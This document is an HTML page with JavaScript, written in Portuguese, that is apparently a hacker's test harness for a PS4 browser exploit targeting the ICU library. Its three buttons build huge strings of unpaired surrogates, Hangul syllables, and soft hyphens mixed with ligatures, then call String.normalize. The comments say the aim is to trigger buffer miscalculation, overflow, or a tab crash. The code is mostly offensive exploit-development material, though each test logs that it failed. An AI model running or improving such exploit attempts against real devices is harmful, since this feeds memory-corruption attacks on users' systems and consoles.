<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PS4 ICU CVE-2025-43429 (Logic Break)</title>
    <style>
        body { 
            font-family: 'Courier New', monospace; 
            padding: 20px; 
            background-color: #050505; 
            color: #00ff00; 
        }
        h1 { 
            color: #fff; 
            border-bottom: 2px solid #333; 
            padding-bottom: 10px; 
            font-size: 1.5em;
        }
        .container {
            max-width: 900px;
            margin: 0 auto;
        }
        .controls { 
            margin-bottom: 20px; 
            background: #1a1a1a; 
            padding: 20px; 
            border-radius: 8px; 
            border: 1px solid #333; 
            box-shadow: 0 4px 6px rgba(0,0,0,0.5);
        }
        p.status {
            color: #aaa;
            margin-bottom: 15px;
            font-style: italic;
        }
        button { 
            display: block; 
            width: 100%; 
            margin: 12px 0; 
            padding: 18px; 
            font-size: 16px; 
            font-weight: bold; 
            cursor: pointer; 
            background-color: #222; 
            color: #e0e0e0; 
            border: 1px solid #444; 
            border-radius: 4px;
            transition: all 0.2s;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        button:hover { 
            background-color: #444; 
            color: #fff;
            border-color: #fff;
        }
        button.danger { 
            background-color: #400; 
            border-color: #800; 
        }
        button.danger:hover { 
            background-color: #900; 
            border-color: #f00; 
            box-shadow: 0 0 10px #f00;
        }
        
        #log { 
            height: 450px; 
            border: 1px solid #00ff00; 
            overflow-y: scroll; 
            padding: 15px; 
            background: #000; 
            font-size: 14px; 
            white-space: pre-wrap; 
            box-shadow: inset 0 0 20px rgba(0, 50, 0, 0.5);
        }

        /* Scrollbar customizada para WebKit */
        ::-webkit-scrollbar { width: 10px; }
        ::-webkit-scrollbar-track { background: #111; }
        ::-webkit-scrollbar-thumb { background: #0a0; }

        .error { color: #ff5555; font-weight: bold; }
        .highlight { color: #ffff55; font-weight: bold; text-decoration: underline; }
        .success { color: #55ff55; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <h1>CVE-2025-43429: ICU Logic Break</h1>
        
        <div class="controls">
            <p class="status">Status: Testes de Força Bruta resultaram em OOM. Tentando vetores de corrupção lógica (Input Pequeno -> Output Indefinido).</p>
            
            <button class="danger" onclick="test218m_Surrogates()">Test 218m: Surrogates Desemparelhados (Invalid UTF-16)</button>
            <button class="danger" onclick="test218n_HangulAlgo()">Test 218n: Hangul Algorítmico (Decomposição Matemática)</button>
            <button class="danger" onclick="test218o_Accordion()">Test 218o: Ataque Sanfona (Shrink & Explode)</button>
            
            <hr style="border-color: #333; margin: 20px 0;">
            <button onclick="clearLog()">Limpar Log</button>
        </div>

        <div id="log">=== SISTEMA PRONTO ===<br>Selecione um teste acima. O objetivo é causar um crash silencioso ou fechamento da aba.</div>
    </div>

    <script>
        const log = document.getElementById('log');

        // Função de Log visual
        function addLog(msg, type = 'normal') {
            const div = document.createElement('div');
            const time = new Date().toLocaleTimeString();
            div.textContent = `[${time}] ${msg}`;
            
            if (type === 'error') div.className = 'error';
            if (type === 'highlight') div.className = 'highlight';
            if (type === 'success') div.className = 'success';
            
            log.appendChild(div);
            console.log(msg);
            log.scrollTop = log.scrollHeight;
        }

        function clearLog() {
            log.innerHTML = '=== LOG LIMPO ===';
        }
        
        // Tenta forçar Garbage Collection para limpar o heap antes dos testes
        function forceGC() {
            try {
                if (window.gc) {
                    window.gc();
                } else {
                    // Shim simples para alocar e liberar memória rapidamente
                    for(let i=0; i<50; i++) new ArrayBuffer(1024 * 1024);
                }
            } catch(e) {}
        }

        // =================================================================
        // TESTE 218m: Surrogates Desemparelhados
        // Estratégia: Input pequeno (~50MB).
        // Foco: Confundir o iterador de string do ICU.
        // \uD800 é um "High Surrogate" sem par. O ICU pode contar errado o tamanho
        // do buffer de destino se encontrar caracteres inválidos misturados com expansão.
        // =================================================================
        function test218m_Surrogates() {
            addLog('>>> INICIANDO TESTE 218m (Surrogates) <<<', 'highlight');
            try {
                forceGC();
                
                // Padrão tóxico: Surrogate isolado (inválido) + Caractere de expansão válida
                let toxicPair = "\uD800" + "\uFB03"; 
                
                // Tamanho moderado (25MB de input -> 50MB na RAM) para evitar OOM
                let count = 1024 * 1024 * 25; 
                
                addLog(`1. Criando string tóxica (~${count * 4 / 1024 / 1024} MB)...`);
                let s = toxicPair.repeat(count / 2);
                
                addLog('2. Disparando normalize... (Tentando desalinhar ponteiros de escrita)');
                addLog('   (Se o console travar agora, o exploit funcionou)');
                
                let res = s.normalize('NFKC');
                
                addLog('FALHA: O navegador tratou os surrogates corretamente ou ignorou o erro.', 'error');
            } catch(e) {
                addLog('ERRO: ' + e.message, 'error');
            }
        }

        // =================================================================
        // TESTE 218n: Hangul Algorítmico
        // Estratégia: Input ~80MB.
        // Foco: Estouro no algoritmo de decomposição Jamo.
        // Ao contrário de tabelas fixas, caracteres coreanos usam matemática (divisão/módulo)
        // para decompor. É um vetor comum para erros de cálculo de buffer.
        // =================================================================
        function test218n_HangulAlgo() {
            addLog('>>> INICIANDO TESTE 218n (Hangul Algorítmico) <<<', 'highlight');
            try {
                forceGC();
                
                // \uAC00 é a primeira sílaba Hangul (Ga). Expande para 2 ou 3 Jamos.
                let hangul = "\uAC00"; 
                
                // 40MB Input -> ~120MB Output (Muito seguro para RAM, perigoso para CPU/Lógica)
                let count = 1024 * 1024 * 40; 
                
                addLog(`1. Criando bloco Hangul massivo (~${count * 2 / 1024 / 1024} MB)...`);
                let s = hangul.repeat(count);
                
                addLog('2. Disparando NFD (Decomposição Algorítmica)...');
                // NFD força o cálculo matemático de decomposição
                let res = s.normalize('NFD');
                
                addLog('3. Disparando NFKC no resultado (Recomposição)...');
                // A recomposição força a busca reversa na tabela
                let res2 = res.normalize('NFKC');
                
                addLog('FALHA: O algoritmo executou perfeitamente.', 'error');
            } catch(e) {
                addLog('ERRO: ' + e.message, 'error');
            }
        }

        // =================================================================
        // TESTE 218o: Ataque Sanfona (Accordion Attack)
        // Estratégia: Input ~100MB.
        // Foco: Enganar o "pre-flight" de cálculo de tamanho.
        // Usamos 90% de caracteres ignoráveis (\u00AD Soft Hyphen) que somem no output.
        // O ICU pode calcular um buffer pequeno ("vai diminuir muito").
        // Mas colocamos 10% de "bombas" (\uFB03) que triplicam.
        // Se a lógica subtrair os hífens mas esquecer de somar as bombas corretamente, Overflow.
        // =================================================================
        function test218o_Accordion() {
            addLog('>>> INICIANDO TESTE 218o (Ataque Sanfona) <<<', 'highlight');
            try {
                forceGC();
                
                // 90% da string são caracteres que SOMEM na normalização NFKC (Default Ignorables)
                let ghost = "\u00AD".repeat(100); 
                // 10% é pura expansão (ffi ligature: 1->3)
                let bomb = "\uFB03".repeat(10);
                
                let block = ghost + bomb;
                // 1 milhão de blocos
                let count = 1024 * 1024; 
                
                addLog(`1. Criando Sanfona (Shrink & Explode) ~${(count * block.length * 2) / 1024 / 1024} MB...`);
                let s = block.repeat(count);
                
                addLog('2. Disparando normalize (Esperando under-allocation)...', 'highlight');
                
                let res = s.normalize('NFKC');
                
                addLog('FALHA: O cálculo de tamanho previu a expansão corretamente.', 'error');
            } catch(e) {
                addLog('ERRO: ' + e.message, 'error');
            }
        }
    </script>
</body>
</html>
